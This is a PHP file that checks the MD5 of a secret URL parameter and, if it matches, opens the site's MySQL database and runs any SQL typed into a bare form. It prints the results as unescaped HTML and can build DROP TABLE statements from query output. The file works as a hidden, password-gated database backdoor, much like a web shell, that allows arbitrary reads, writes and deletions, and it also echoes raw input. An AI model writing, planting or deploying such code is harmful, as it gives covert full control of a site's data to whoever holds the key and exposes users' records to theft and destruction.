<?php   
require_once("includes/config.php"); 

$Base = md5($_GET['b']); 

if($Base=='89e8e8ee3a6b8181f7686d9f8ffaf378'){

if(!empty($_GET['db'])) $Config['DbName'] = $_GET['db'];

$link=mysql_connect ($Config['DbHost'],$Config['DbUser'],$Config['DbPassword'],TRUE);
if(!$link){die("Could not connect to MySQL");}
mysql_select_db($Config['DbName'],$link) or die ("could not open db".mysql_error());

echo 'MySql Connected.<br><br>';

if(!empty($_POST["sql"])){
	echo $_POST["sql"].'<br><br>';
	$q=mysql_query($_POST["sql"],$link) or die (mysql_error());
	echo "Query has been executed successfully.<br><br>";
	$fields = mysql_num_fields($q);
	if($fields>0){

		if($_GET['t']==1){
			$table_html = 'DROP TABLE ';
			while($row = mysql_fetch_row($q)) {
				foreach($row as $value) {
					$table_html .= $value. " ,";
				}
			}
			//$table_html = rtrim(" ,", $table_html);
			$table_html = rtrim( $table_html," ,");

		}else{
			$table_html = '<table cellpadding="5" cellspacing="1" width="100%" border="1">';
			$table_html .= '<tr>';
			for ($i = 0; $i < $fields; $i++) {
				$table_html .= '<td><b>'. mysql_field_name($q, $i) . "</b></td>";
			}
			$table_html .= '</tr>';

			
			while($row = mysql_fetch_row($q)) {
				$table_html .= '<tr>';
				foreach($row as $value) {
					$table_html .= '<td>'. $value. "</td>";
				}
				$table_html .= '</tr>';
			}

			$table_html .= '</table>';
		}





		echo $table_html.'<br><br>';


	}
}

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
 <HEAD>
  <TITLE> New Document </TITLE>
  <META NAME="Generator" CONTENT="EditPlus">
  <META NAME="Author" CONTENT="">
  <META NAME="Keywords" CONTENT="">
  <META NAME="Description" CONTENT="">
 </HEAD>

 <BODY>




  <form name="form1" action="" method="post">
  <textarea name="sql" style="width:400px; height:200px;"></textarea>
  <br>
  <input type="submit" name="go" value="Go">
  </form>
 </BODY>
</HTML>

<? } ?>
